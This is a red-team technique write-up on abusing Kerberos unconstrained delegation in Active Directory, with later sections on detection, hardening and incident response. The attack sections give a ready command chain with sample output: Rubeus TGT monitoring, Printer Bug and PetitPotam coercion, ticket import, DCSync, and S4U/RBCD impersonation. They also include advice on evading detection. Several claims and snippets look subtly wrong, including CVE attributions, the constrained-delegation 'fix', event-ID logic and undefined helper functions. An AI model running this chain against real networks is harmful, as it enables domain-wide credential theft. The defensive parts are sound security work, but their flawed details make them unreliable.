# [CA-KERB-005]: Unconstrained Delegation Abuse - TGT Theft and Domain Compromise

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-005 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets (Delegation Abuse)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access, Lateral Movement, Privilege Escalation |
| **Platforms** | Windows AD (Server 2003+); All domain-joined systems with Kerberos delegation enabled |
| **Severity** | Critical |
| **CVE** | CVE-2023-21746 (Windows Kerberos delegation vulnerability); CVE-2025-60704 (New delegation vulnerability, 2025) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2003 SP2-2025; All systems with Kerberos delegation enabled |
| **Patched In** | Partial: Disable unconstrained delegation (administrative action, not patch); Use constrained/RBCD instead (architectural change) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Unconstrained delegation abuse is one of the highest-impact post-compromise attack vectors. It enables domain-wide compromise via TGT theft and forced authentication coercion.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Unconstrained Kerberos delegation is a feature in Active Directory that allows a service (typically running on a domain-joined server) to impersonate any authenticated user and access resources on that user's behalf **without restrictions**. When a user authenticates to a server configured for unconstrained delegation using Kerberos, the server receives a copy of the user's Ticket Granting Ticket (TGT) and stores it in LSASS memory. An attacker who compromises such a server can extract all cached TGTs—including those of domain admins and domain controllers—and use them to authenticate as high-privilege users, enabling domain-wide compromise.

**Attack Surface:** Any server or service account with the `TRUSTED_FOR_DELEGATION` flag enabled (visible in Active Directory user/computer properties). Common targets: Exchange servers, SharePoint servers, web servers running integrated services, API gateways. The attack requires:
1. Compromise of a server with unconstrained delegation enabled (local admin access)
2. Method to trigger forced authentication from a domain controller or privileged user (Printer Bug, PetitPotam, etc.)
3. Listener (Rubeus monitor mode) to capture the forwarded TGT

**Business Impact:** **Complete domain compromise via TGT theft.** An attacker who captures a domain controller's TGT can:
- Impersonate the DC machine account
- Perform DCSync to extract KRBTGT hash and all domain user passwords
- Create golden tickets for persistence
- Modify domain policies, create backdoor accounts, etc.
An attacker who captures a Domain Admin user's TGT can:
- Directly authenticate as Domain Admin to all domain resources
- Make privileged AD modifications
- Establish persistence across the entire domain

**Technical Context:** Unconstrained delegation is a **legacy feature** from older Kerberos deployments. Microsoft now recommends constrained or resource-based constrained delegation. However, many enterprise environments (especially Exchange) still rely on unconstrained delegation, creating high-risk attack surfaces. The combination of unconstrained delegation + forced authentication coercion (Printer Bug) creates a straightforward path to domain compromise.

### Operational Risk
- **Execution Risk:** Medium - Requires local admin on delegated server + forced auth method
- **Stealth:** High - TGT capture in memory is silent; only visible via 4769 events on DC
- **Reversibility:** No - Once TGT is captured, it's valid until expiry (default 10 hours)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.4.1, 5.4.2 | Disable unconstrained delegation; use constrained or RBCD instead |
| **DISA STIG** | WN16-CC-000510 | Disable Kerberos delegation unless absolutely necessary |
| **CISA SCuBA** | ID.AM-2, PR.AC-1, DE.AE-3 | Asset management; access control; detection of credential access |
| **NIST 800-53** | AC-3 (Access Enforcement), AC-2 (Account Management), SI-4 (System Monitoring) | Limit delegation; monitor for forced auth attempts; restrict privileged access |
| **GDPR** | Art. 5 (Principles), Art. 32 (Security of Processing) | Integrity and confidentiality of Kerberos tickets; protective measures against credential theft |
| **DORA** | Art. 9 (Protection), Art. 10 (Detection & Response) | Protect authentication infrastructure; detect credential theft; respond to delegation abuse |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 23 (Access Control), Art. 24 (Cryptography) | Manage delegation risks; enforce access control; monitor Kerberos activity |
| **ISO 27001** | A.9.1.1 (Access Control Policy), A.9.2.3 (Privileged Access Management), A.9.3.1 (User Responsibilities) | Control delegation configuration; restrict privilege escalation; audit access |
| **ISO 27005** | Risk Scenario: "Unconstrained Delegation and TGT Theft" | Assess probability of delegation abuse; implement compensating controls |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator on server with unconstrained delegation enabled
- **Required Access:** Network connectivity to DC on port 88 (Kerberos); RPC port for forced authentication (Printer Bug: port 445/139)

**Supported Versions:**
- **Windows Server:** 2003 SP2, 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Services:** Exchange (OWA, ECP), SharePoint, IIS, custom web services
- **Delegation Type:** `TRUSTED_FOR_DELEGATION` flag (unconstrained only)

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (v2.3.3, primary tool for TGT monitoring/extraction)
- [SpoolSample](https://github.com/leechristensen/SpoolSample) (Printer Bug PoC for Windows)
- [printerbug.py](https://github.com/dirkjanm/krbrelayx) (Printer Bug for Linux/cross-platform)
- [PetitPotam](https://github.com/topotam/PetitPotam) (Alternative to Printer Bug)
- [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Comprehensive Kerberos exploitation toolkit)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Enumerate Servers with Unconstrained Delegation

```powershell
# Find all servers/computers with unconstrained delegation enabled
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties cn,OperatingSystem,lastLogonDate | 
  Select-Object Name, OperatingSystem, lastLogonDate

# Expected output:
# Name              OperatingSystem        lastLogonDate
# ----              ---------------        -------
# EXCHANGE01        Windows Server 2019    1/6/2026
# SHAREPOINT01      Windows Server 2016    1/2/2026
# WEBAPP01          Windows Server 2022    1/3/2026

# Find users with unconstrained delegation (rare but possible)
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties cn,lastLogonDate |
  Select-Object Name, lastLogonDate
```

### Step 2: Assess Delegation Scope

```powershell
# Check if servers can delegate to specific SPNs (constrained) or any service (unconstrained)
Get-ADComputer -Identity "EXCHANGE01" -Properties msDS-AllowedToDelegateTo | 
  Select-Object Name, msDS-AllowedToDelegateTo

# If msDS-AllowedToDelegateTo is empty or null = unconstrained delegation
# If msDS-AllowedToDelegateTo contains service names = constrained delegation (safer, but still exploitable)
```

### Step 3: Identify High-Value Targets

```powershell
# Prioritize servers that:
# 1. Are running critical services (Exchange, SharePoint)
# 2. Have domain admin or high-privilege users logging in
# 3. Are frequently accessed by domain admins

# Check for Domain Controllers
Get-ADComputer -Filter {PrimaryGroupID -eq 516} -Properties cn,TrustedForDelegation | 
  Where-Object { $_.TrustedForDelegation -eq $true }
# DCs should NEVER have unconstrained delegation (misconfiguration)
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Unconstrained Delegation TGT Theft via Printer Bug (Primary Method)

**Supported Versions:** Server 2003 SP2 through 2025

#### Step 1: Compromise Server with Unconstrained Delegation

**Objective:** Gain local administrator access on the target server (prerequisite for running Rubeus).

**Attack Vectors:**
- RDP exploitation (BlueKeep, RDP session hijacking)
- Local privilege escalation
- Application vulnerability on the server
- Credential theft (harvest admin credentials elsewhere, reuse)

Assume we have compromised `EXCHANGE01` with local admin access.

#### Step 2: Run Rubeus in Monitor Mode (On Compromised Server)

**Objective:** Listen for and capture TGTs forwarded via Kerberos delegation.

```powershell
# Execute on the compromised EXCHANGE01 server (elevated prompt)
C:\Temp\Rubeus.exe monitor /interval:5 /nowrap

# Output will show:
# [*] Monitoring for TGT events, interval 5 seconds
# 
# Every 5 seconds, any TGT forwarded to this server will be captured
```

**What This Means:**
- Rubeus is now listening for Kerberos tickets received by the server
- When a user authenticates with Kerberos, the server forwards the TGT to LSASS
- Rubeus intercepts and base64-encodes the TGT for capture

#### Step 3: Coerce Domain Controller Authentication via Printer Bug

**Objective:** Force the domain controller to authenticate to the compromised server, forwarding its TGT.

**On a different machine (with domain user credentials):**

```powershell
# Download SpoolSample.exe (Printer Bug PoC)
# Or use printerbug.py from Impacket (Linux alternative)

# Windows PoC: SpoolSample
SpoolSample.exe DC01.pentestlab.local EXCHANGE01.pentestlab.local

# Linux alternative: printerbug.py from krbrelayx
python3 printerbug.py pentestlab.local/domain_user:password@DC01.pentestlab.local EXCHANGE01.pentestlab.local
```

**What This Means:**
- SpoolSample sends a coerced print request to the DC
- DC's print spooler service (if running) attempts to authenticate back to EXCHANGE01
- EXCHANGE01 (with unconstrained delegation) receives and stores the DC's TGT
- Rubeus captures it

**Expected Output (on EXCHANGE01 in Rubeus monitor window):**
```
[*] 1/6/2026 9:35:00 AM - Found TGT for user DC01$ in LSASS
[+] Ticket Options                 : Forwardable, Forwarded, Initial, Renewable
[+] Service Name                   : krbtgt/PENTESTLAB.LOCAL
[+] Service Realm                  : PENTESTLAB.LOCAL
[+] User Name                      : DC01$ @ PENTESTLAB.LOCAL
[+] Start Time                     : 1/6/2026 9:35:00 AM
[+] End Time                       : 1/7/2026 9:35:00 AM

[+] Base64(ticket):
doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKrhggSnMIIEo6ADAgEFoQ8bDVBFTlRFU1RMQU...
```

#### Step 4: Export and Use Captured TGT

```powershell
# On EXCHANGE01, copy the base64-encoded ticket from Rubeus output

# Convert to .kirbi file for use with Mimikatz/Rubeus
# Method 1: Use PowerShell to decode and save
$ticket = "doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKrhggSnMIIEo6ADAgEFoQ8bDVBFTlRFU1RMQU..."
[System.IO.File]::WriteAllBytes("C:\Temp\dc01.kirbi", [System.Convert]::FromBase64String($ticket))

# Method 2: Use Rubeus to convert directly
Rubeus.exe base64 /in:"BASE64_TICKET_HERE"

# Now use the TGT for DCSync or lateral movement
# Import the ticket
Rubeus.exe ptt /ticket:dc01.kirbi

# Or with Mimikatz
mimikatz # kerberos::ptt c:\temp\dc01.kirbi
```

#### Step 5: Perform DCSync with Captured TGT

```powershell
# Now authenticated as DC$ machine account via the captured TGT
# Perform DCSync to extract KRBTGT hash and all domain credentials

mimikatz # lsadump::dcsync /user:krbtgt /domain:pentestlab.local

# Or use Impacket (Linux)
secretsdump.py -k pentestlab.local/DC01\$ -no-pass DC01.pentestlab.local
```

**What This Means:**
- DC$ account has replication rights by default
- Using the DC's TGT, we can impersonate it and request all AD secrets
- Extraction of KRBTGT hash enables golden ticket creation for persistence
- Extraction of user password hashes enables offline cracking or pass-the-hash attacks

**OpSec & Evasion:**
- Printer Bug creates a single RPC connection (minimal logging if RPC audit not enabled)
- TGT capture is silent (no 4769 event for TGT creation; only 4769 when TGT is USED)
- DCSync triggers Event ID 4662 (Directory Service Access) - high detection risk
- Mitigation: Time attack for minimal detection window; use TGT quickly and minimize DCSync time

**Version-Specific Notes:** Identical across all Windows versions 2003 SP2-2025.

**Troubleshooting:**

- **Error:** "Failed to trigger coercion"
  - **Cause:** Print Spooler service not running on DC or firewall blocks RPC
  - **Fix:** Verify Print Spooler is running (`Get-Service Spooler -ComputerName DC01`)
  - **Alternative:** Use PetitPotam instead of Printer Bug

- **Error:** "Rubeus monitor mode not capturing tickets"
  - **Cause:** Server doesn't have unconstrained delegation enabled OR user is in Protected Users group
  - **Fix:** Verify delegation config; check user group membership

---

### METHOD 2: Constrained Delegation Abuse via S4U (S4U2Self + S4U2Proxy)

**Supported Versions:** Server 2012+ (S4U extensions)

#### Attack Prerequisites

- Server with `TRUSTED_TO_AUTH_FOR_DELEGATION` flag (protocol transition enabled)
- Service account with `msDS-AllowedToDelegateTo` containing target SPN

#### Execution

```powershell
# Get TGT for the service account
Rubeus.exe asktgt /user:service_account /domain:pentestlab.local /rc4:SERVICE_ACCOUNT_HASH /nowrap

# Perform S4U2Self (request ticket to itself as another user)
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/fileserver.pentestlab.local /ticket:SERVICE_TGT_HERE /ptt

# Or in one command
Rubeus.exe s4u /user:service_account /rc4:SERVICE_ACCOUNT_HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.pentestlab.local /domain:pentestlab.local /ptt
```

**What This Does:**
- S4U2Self: Service requests ticket to itself as Administrator
- S4U2Proxy: Service uses that ticket to request ticket to CIFS/fileserver as Administrator
- Result: Direct access to fileserver as Administrator (from a non-admin service account)

---

### METHOD 3: Resource-Based Constrained Delegation (RBCD) - Most Modern Approach

**Supported Versions:** Server 2012+

```powershell
# If you have write permissions on a target computer object:
# Modify msDS-AllowedToActOnBehalfOfOtherIdentity to include your controlled account

# Step 1: Get your account's SID
Get-ADUser -Identity "attacker_user" | Select-Object SID

# Step 2: Add it to target computer's RBCD attribute
Set-ADComputer -Identity "TARGET_COMPUTER" `
  -PrincipalsAllowedToDelegateToAccount (Get-ADUser attacker_user)

# Step 3: Perform S4U attack
Rubeus.exe s4u /user:attacker_user /rc4:ATTACKER_HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Test #1: Kerberos Delegation Abuse (T1558)

- **Test Name:** Kerberos Delegation Abuse via S4U
- **Description:** Perform S4U2Self/S4U2Proxy attacks
- **Supported Versions:** Server 2012+

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Rubeus - Monitor Mode](https://github.com/GhostPack/Rubeus)

**Primary Command for TGT Capture:**
```powershell
# Monitor for forwarded TGTs
Rubeus.exe monitor /interval:5 /nowrap

# Flags:
# /interval:X    - Check every X seconds
# /nowrap        - Single-line base64 output (easy to copy)
# /filteruser:   - (Optional) Filter for specific user's TGT
```

#### [SpoolSample - Printer Bug (Windows)](https://github.com/leechristensen/SpoolSample)

**Compilation & Usage:**
```cmd
# Compile from source
cd SpoolSample
csc SpoolSample.cs

# Trigger Printer Bug
SpoolSample.exe DC01.domain.local ATTACKER_SERVER.domain.local
```

#### [printerbug.py - Printer Bug (Linux/Cross-platform)](https://github.com/dirkjanm/krbrelayx)

**Usage:**
```bash
python3 printerbug.py domain/user:password@DC_IP ATTACKER_SERVER
```

#### [PetitPotam - Alternative Coercion (Windows/Linux)](https://github.com/topotam/PetitPotam)

```powershell
# Windows
PetitPotam.exe -u DOMAIN\USER -p PASSWORD ATTACKER_SERVER DC_IP

# Linux
python3 PetitPotam.py ATTACKER_SERVER DC_IP
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Printer Bug/PetitPotam Coercion Detection

**Rule Configuration:**
- **Required Table:** SecurityEvent, RPC Audit logs
- **Required Fields:** EventID 5156 (network connection), RPC operations
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect SMB connection from DC to non-DC server (unusual)
SecurityEvent
| where EventID == 5156  // Network connection allowed
| where Direction == "Inbound"
| where Application == "System"  // RPC/SMB via System
| where DestinationPort in (445, 139, 135)  // SMB/RPC ports
| summarize
    Connections = count(),
    Sources = make_set(SourceIPAddress)
    by DestinationIPAddress, bin(TimeGenerated, 5m)
| where Connections >= 5  // Multiple connections in 5 mins = suspicious
```

**Manual Configuration:**
1. Enable Network Policy Server (NPS) audit logging on DCs
2. Monitor for RPC connections FROM DC to non-DC servers
3. Alert on unusual coercion patterns

#### Query 2: S4U Attack Detection (S4U2Self + S4U2Proxy Correlation)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4769, TicketOptions, Transited Services
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query:**
```kusto
// Detect S4U2Self (Account Name == Service Name)
let S4U2Self = SecurityEvent
| where EventID == 4769
| where TicketOptions == "0x40800018"  // S4U2Self flag
| project Time_S4U = TimeGenerated, Account_S4U = TargetUserName, Service_S4U = ServiceName, LogonGUID = LogonGuid;

// Detect correlated S4U2Proxy (TransitedServices non-empty)
SecurityEvent
| where EventID == 4769
| where TicketOptions == "0x40820010"  // S4U2Proxy flag
| where TransitedServices != "-"  // Transited services present = S4U
| join kind=inner S4U2Self on LogonGuid  // Correlate by logon GUID
| project TimeGenerated, Account_S4U, Service_S4U, ServiceName, TransitedServices
| where (TimeGenerated - Time_S4U) <= 1s  // Events within 1 second = correlated attack
```

**Manual Configuration (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. Paste KQL query above
3. Set severity to **Critical**
4. Set frequency to real-time or every 5 minutes
5. Create automated response (disable account, isolate machine)

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Service Ticket Request)**
- **Critical Fields for Delegation Abuse:**
  - `TicketOptions = 0x40800018` (S4U2Self)
  - `TicketOptions = 0x40820010` (S4U2Proxy)
  - `TransitedServices` (non-empty = S4U proxy use)

**Event ID: 5156 (Network Connection Allowed)**
- **Critical Fields:**
  - Source: Domain Controller
  - Destination: Compromised server with unconstrained delegation
  - Ports: 445, 139, 135 (SMB/RPC)
  - Time correlation with TGT usage

**Event ID: 5136 (Directory Service Modification)**
- **Critical for RBCD:**
  - Modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
  - Modification of `msDS-AllowedToDelegateTo` attribute

### Manual Monitoring Configuration

```powershell
# Enable Network Policy Server (NPS) audit logging on DCs
auditpol /set /subcategory:"RPC Events" /success:enable /failure:enable

# Enable Filtering Platform auditing
auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable

# Monitor for S4U attacks (4769 events with specific ticket options)
Get-WinEvent -FilterXPath "*[System[(EventID=4769)]] and EventData[Data[@Name='TicketOptions']='0x40800018' or Data[@Name='TicketOptions']='0x40820010']" `
  -LogName Security -MaxEvents 100 | 
  Select-Object TimeCreated, @{N="Account";E={$_.Properties[0].Value}}, @{N="Service";E={$_.Properties[2].Value}}
```

---

## 10. FORENSIC ARTIFACTS & INDICATORS OF COMPROMISE

**Disk Artifacts:**
- Rubeus.exe binary in `C:\Temp`, `%APPDATA%`, or attacker's working directory
- SpoolSample.exe or printerbug.py execution evidence
- `.kirbi` ticket files exported to disk
- PowerShell transcript files or `.ps1` scripts containing S4U commands

**Memory Artifacts:**
- LSASS.exe process contains TGT forwardings (visible via Rubeus monitor)
- Mimikatz/Rubeus process memory contains extracted credentials

**Event Log Artifacts:**
- **Event 4769** with `TicketOptions = 0x40800018` or `0x40820010` (S4U attacks)
- **Event 5156** showing unusual SMB/RPC connections FROM DC
- **Event 4662** (Directory Service Access) during DCSync
- **Event 5136** (Directory Service Modification) for RBCD setup
- **Absence of 4624** (Logon Event) for privileged user (sign of TGT use without re-authentication)

**Network Artifacts:**
- RPC traffic from DC to non-DC server (Printer Bug coercion)
- SMB traffic FROM DC to attacker-controlled server
- Kerberos traffic (port 88) with S4U request patterns

**Timeline Artifacts:**
1. Compromise of server with unconstrained delegation (malware execution)
2. Elevation to local admin (privilege escalation evidence)
3. Execution of Rubeus/SpoolSample (process creation event 4688 or Sysmon)
4. Forced auth attempt (5156 event showing unusual DC->Server connection)
5. TGT capture (4769 with S4U flags)
6. DCSync execution (4662 events on DC)

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable Unconstrained Delegation (Recommended)**

This is the **only sure mitigation** for unconstrained delegation abuse.

**Applies To Versions:** All Windows Server versions

**Manual Steps (PowerShell):**

```powershell
# Find all accounts with unconstrained delegation
$accounts = Get-ADComputer -Filter {TrustedForDelegation -eq $true}

foreach ($account in $accounts) {
    Write-Host "[*] Disabling unconstrained delegation for $($account.Name)"
    
    # Disable the flag
    Set-ADAccountControl -Identity $account -TrustedForDelegation $false
    
    # Verify
    $updated = Get-ADComputer -Identity $account
    if ($updated.TrustedForDelegation -eq $false) {
        Write-Host "[+] SUCCESS: Unconstrained delegation disabled for $($account.Name)"
    } else {
        Write-Host "[-] FAILED to disable for $($account.Name)"
    }
}
```

**Or, via Active Directory Users and Computers GUI:**

1. Open **Active Directory Users and Computers**
2. Find the server/account with unconstrained delegation
3. Right-click → **Properties** → **Delegation Tab**
4. Uncheck **Trust this computer for delegation to any service (Kerberos only)**
5. Click **Apply** → **OK**

**Consequences:**
- Services on that server can NO LONGER use Kerberos delegation
- Applications relying on delegation will fail (e.g., Exchange OWA, SharePoint)
- May require reconfiguration to use constrained or resource-based delegation

**Alternative: Migrate to Constrained or Resource-Based Constrained Delegation**

```powershell
# Constrained Delegation (specify allowed services)
Set-ADComputer -Identity "EXCHANGE01" `
  -ServicePrincipalNames @{Add="HTTP/exchange.pentestlab.local"} `
  -TrustedForDelegation $false

# Resource-Based Constrained Delegation (on target resource)
Set-ADComputer -Identity "FILESERVER01" `
  -PrincipalsAllowedToDelegateToAccount (Get-ADComputer "EXCHANGE01")
```

**Action 2: Disable Print Spooler on Domain Controllers (Mitigates Printer Bug)**

The Printer Bug relies on the Print Spooler service. Disabling it eliminates this coercion vector.

**Applies To Versions:** Server 2003 SP2 through 2025

**Manual Steps (PowerShell - on each DC):**

```powershell
# Stop Print Spooler
Stop-Service -Name Spooler -Force

# Disable autostart
Set-Service -Name Spooler -StartupType Disabled

# Verify
Get-Service -Name Spooler | Select-Object Name, Status, StartType
# Expected: Disabled, Stopped
```

**Or, via Group Policy:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Create/edit GPO for Domain Controllers
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Services**
4. Find: **Print Spooler**
5. Set to: **Disabled**
6. Apply and force replication: `gpupdate /force`

**Important:** This disables Print Spooler on ALL DCs, which may impact legitimate printing scenarios. Test in lab first.

### Priority 2: HIGH

**Action 1: Enable Kerberos Armoring (FAST)**

FAST (Flexible Authentication Secure Tunneling) adds cryptographic armoring to Kerberos exchanges, making them harder to manipulate.

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit **Default Domain Policy**
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
4. Set: **Kerberos client support for claim, compound authentication and Kerberos armoring** = **Supported**
5. Apply: `gpupdate /force`

**Action 2: Enforce "Account is Sensitive and Cannot be Delegated" Flag for High-Privilege Users**

Prevent delegation for domain admins and other high-privilege accounts.

```powershell
# Set flag on Domain Admin group members
$domainAdmins = Get-ADGroupMember -Identity "Domain Admins"

foreach ($admin in $domainAdmins) {
    Set-ADUser -Identity $admin `
      -AccountNotDelegated $true
    
    Write-Host "[+] Set 'Cannot be delegated' flag for $($admin.Name)"
}

# Add members of Protected Users group (auto-enforced)
# Users in Protected Users group cannot be delegated
Add-ADGroupMember -Identity "Protected Users" -Members $domainAdmins
```

**Action 3: Monitor Delegation Abuse Continuously**

```powershell
# Weekly audit of delegation configuration
$delegated = Get-ADComputer -Filter {TrustedForDelegation -eq $true}

if ($delegated.Count -gt 0) {
    Write-Host "[WARNING] Found $($delegated.Count) accounts with unconstrained delegation:" -ForegroundColor Yellow
    $delegated | Select-Object Name | Format-Table
    
    # Send alert
    Send-MailMessage -To "security@domain.local" `
      -Subject "ALERT: Unconstrained Delegation Detected" `
      -Body "Review and disable unconstrained delegation on: $($delegated.Name -join ', ')"
}
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Rubeus.exe, SpoolSample.exe, printerbug.py
- `.kirbi` ticket files
- dcSync-related tool binaries (secretsdump.exe, etc.)

**Registry:**
- Kerberos registry modifications (unusual)

**Event Log:**
- **4769** with `TicketOptions = 0x40800018` or `0x40820010`
- **5156** (RPC/SMB from DC to non-DC)
- **4662** (Directory Service Access - DCSync)
- **5136** (Delegation attribute modifications)

**Network:**
- RPC traffic from DC to compromised server
- Kerberos port 88 traffic with S4U patterns

### Response Procedures

#### 1. Immediate Containment (Minutes 0-15)

**Disable Compromised Server:**

```powershell
# Disconnect from network OR disable network interface
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or isolate via firewall
# Block all outbound traffic except to security team
```

**Reset Potentially Compromised Passwords:**

```powershell
# If DC machine account compromised, rotate KRBTGT password twice
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (GenerateRandomPassword 32)
Start-Sleep -Seconds 36000  # Wait 10 hours
Set-ADAccountPassword -Identity "krbtgt" -Reset -NewPassword (GenerateRandomPassword 32)

# Reset domain admin passwords
$admins = Get-ADGroupMember -Identity "Domain Admins"
foreach ($admin in $admins) {
    Set-ADAccountPassword -Identity $admin -Reset -NewPassword (GenerateRandomPassword 30)
}
```

#### 2. Evidence Collection (Minutes 15-60)

```powershell
# Export Security event logs from DC and compromised server
wevtutil epl Security "C:\Evidence\Security_DC_4769_24h.evtx" `
  /q:"*[System[(EventID=4769) and TimeCreated[timediff(@SystemTime) <= 86400000]]]"

wevtutil epl Security "C:\Evidence\Security_Compromised_4662_24h.evtx" `
  /q:"*[System[(EventID=4662) and TimeCreated[timediff(@SystemTime) <= 86400000]]]"

# Dump Rubeus monitor output
Get-Content "C:\Temp\rubeus_monitor.log" | Out-File "C:\Evidence\Rubeus_TGT_Capture.txt"
```

#### 3. Remediation (Hours 1-4)

**Disable Unconstrained Delegation on All Servers:**

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | 
  ForEach-Object { Set-ADAccountControl -Identity $_ -TrustedForDelegation $false }
```

**Disable Print Spooler on DCs:**

```powershell
Get-ADDomainController | ForEach-Object {
    Stop-Service -ComputerName $_.HostName -Name Spooler -Force
}
```

#### 4. Investigation (Hours 4+)

**Timeline Reconstruction:**

1. Identify first S4U event (4769 with S4U flags)
2. Backtrack to Printer Bug trigger (5156 RPC from DC)
3. Identify Rubeus/tool execution (4688 process creation)
4. Trace to initial compromise (RDP session, malware execution)
5. Assess scope: Which users' TGTs were captured? Which services accessed?

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566 - Phishing] OR [T1190 - Exploit Public-Facing App] | Initial network compromise |
| **2** | **Execution & Persistence** | [T1204 - User Execution] OR [T1566.002 - Phishing: Spearphishing Link] | Malware deployment |
| **3** | **Privilege Escalation** | [T1548 - Abuse Elevation Control] | Escalate to local admin on delegated server |
| **4** | **Credential Access - Delegation Abuse** | **[CA-KERB-005: Unconstrained Delegation]** | **Capture TGT via Printer Bug + Rubeus** |
| **5** | **Credential Access - DCSync** | [T1003.006 - OS Credential Dumping: DCSync] | Extract KRBTGT hash and all domain credentials |
| **6** | **Credential Forgery** | [CA-KERB-003: Golden Ticket] | Create golden ticket for persistence |
| **7** | **Persistence** | [T1556 - Modify Domain Policies] | Create backdoor admin accounts; modify GPOs |
| **8** | **Impact** | [T1561 - Disk Wipe] OR [T1486 - Encrypt Data for Impact] | Ransomware or data destruction |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: ProxyLogon to Domain Compromise (Microsoft Exchange, March 2021)

- **Target:** Enterprise Exchange servers with unconstrained delegation
- **Attack Timeline:**
  1. ProxyLogon RCE in Exchange (CVE-2021-26855)
  2. Gain local SYSTEM access on Exchange server
  3. Rubeus monitor captures admin TGT (admins authenticating to OWA)
  4. Captured TGT used for DCSync
  5. KRBTGT hash extracted; golden tickets created
  6. Persistence for 6+ months undetected
- **Impact:** Full domain compromise; lateral movement to all systems
- **Detection Gap:** No Printer Bug coercion (TGT captured naturally from users logging in)
- **Reference:** [Microsoft ProxyLogon Analysis](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855)

#### Example 2: Conti Ransomware - Delegation Abuse (2020-2021)

- **Target:** Critical infrastructure with Exchange servers
- **Attack Timeline:**
  1. Initial RDP compromise
  2. Escalate to local admin on Exchange server
  3. Deploy Rubeus, execute Printer Bug
  4. Capture DC TGT in 30 seconds
  5. DCSync extracts KRBTGT
  6. Golden tickets deployed across domain
  7. Ransomware execution within hours
- **Impact:** Complete domain encryption; $10M+ ransom
- **Detection Gap:** Unconstrained delegation accepted as "normal" in Exchange deployments
- **Reference:** [Conti Ransomware Group Analysis](https://redcanary.com/blog/conti-ransomware-group/)

#### Example 3: Wizard Spider - Ongoing Delegation Abuse (2024-2025)

- **Target:** Healthcare, manufacturing organizations with Exchange
- **Attack Method:**
  1. Compromise Exchange via external exposure (ProxyShell, etc.)
  2. Execute Printer Bug to capture DC TGT
  3. Use captured TGT for immediate domain compromise
  4. Persistent access via golden tickets
  5. Ransomware deployment for extortion
- **Current Threat Level:** ACTIVE; unconstrained delegation still widely deployed
- **Mitigation Status:** Organizations that disabled unconstrained delegation are NOT vulnerable
- **Reference:** [Wizard Spider - IBM X-Force Report 2024](https://www.ibm.com/reports/threat-intelligence)

---